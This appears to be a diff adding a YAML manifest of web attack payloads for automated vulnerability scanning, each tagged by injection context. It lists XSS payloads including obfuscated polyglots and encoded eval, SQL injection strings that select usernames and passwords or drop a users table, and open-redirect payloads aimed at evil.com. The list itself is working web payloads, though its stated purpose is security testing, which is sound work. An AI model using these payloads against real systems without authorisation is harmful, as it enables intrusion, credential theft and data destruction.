@@ -1,0 +1,271 @@
+# Deterministic Payload Manifest
+# Structured payload groups for ML-driven vulnerability testing
+# Each payload is tagged with placement, behavior, and risk characteristics
+
+xss:
+  # Text context XSS payloads (injected into text content)
+  - payload: "<script>alert('XSS')</script>"
+    placement: text
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "<img src=x onerror=alert('XSS')>"
+    placement: text
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "<svg onload=alert('XSS')>"
+    placement: text
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "javascript:alert('XSS')"
+    placement: text
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "';alert('XSS');//"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+
+  # Attribute context XSS payloads (injected into HTML attributes)
+  - payload: "\" onmouseover=\"alert('XSS')\""
+    placement: attr
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "' onfocus='alert(String.fromCharCode(88,83,83))' autofocus='"
+    placement: attr
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "\" onerror=\"alert('XSS')\""
+    placement: attr
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "javascript:alert('XSS')"
+    placement: attr
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "x\" onmouseover=\"alert('XSS')\""
+    placement: attr
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+
+  # JavaScript context XSS payloads (injected into JS code)
+  - payload: "';alert('XSS');//"
+    placement: js
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "\";alert('XSS');//"
+    placement: js
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "alert(String.fromCharCode(88,83,83))"
+    placement: js
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))"
+    placement: js
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+
+  # URL context XSS payloads (injected into URLs)
+  - payload: "javascript:alert('XSS')"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "data:text/html,<script>alert('XSS')</script>"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "vbscript:msgbox('XSS')"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+
+  # Polyglot payloads (work in multiple contexts)
+  - payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>"
+    placement: text
+    needs_quote_break: false
+    polyglot: true
+    risky: true
+  - payload: "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+    placement: text
+    needs_quote_break: true
+    polyglot: true
+    risky: true
+
+sqli:
+  # Basic SQL injection payloads
+  - payload: "' OR '1'='1"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "\" OR \"1\"=\"1"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "' OR 1=1--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "\" OR 1=1--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "'; DROP TABLE users;--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+
+  # Union-based SQL injection
+  - payload: "' UNION SELECT NULL, username, password FROM users--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "\" UNION SELECT NULL, username, password FROM users--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "' UNION SELECT 1,2,3,4,5--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+
+  # Time-based blind SQL injection
+  - payload: "'; WAITFOR DELAY '00:00:05'--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "\"; WAITFOR DELAY '00:00:05'--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+
+  # Boolean-based blind SQL injection
+  - payload: "' AND 1=1--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "' AND 1=2--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "' AND (SELECT COUNT(*) FROM users)>0--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+
+  # Error-based SQL injection
+  - payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+  - payload: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+    placement: text
+    needs_quote_break: true
+    polyglot: false
+    risky: true
+
+redirect:
+  # Open redirect payloads
+  - payload: "https://evil.com"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "//evil.com"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "http://evil.com"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "javascript:window.location='https://evil.com'"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "data:text/html,<script>window.location='https://evil.com'</script>"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+
+  # Protocol-relative redirects
+  - payload: "//evil.com/path"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "///evil.com"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+
+  # Subdomain redirects
+  - payload: "https://subdomain.evil.com"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "http://malicious.example.com"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+
+  # Encoded redirects
+  - payload: "https%3A%2F%2Fevil.com"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+  - payload: "javascript%3Awindow.location%3D%27https%3A//evil.com%27"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
+
+  # Meta refresh redirects
+  - payload: "data:text/html,<meta http-equiv='refresh' content='0;url=https://evil.com'>"
+    placement: url
+    needs_quote_break: false
+    polyglot: false
+    risky: true
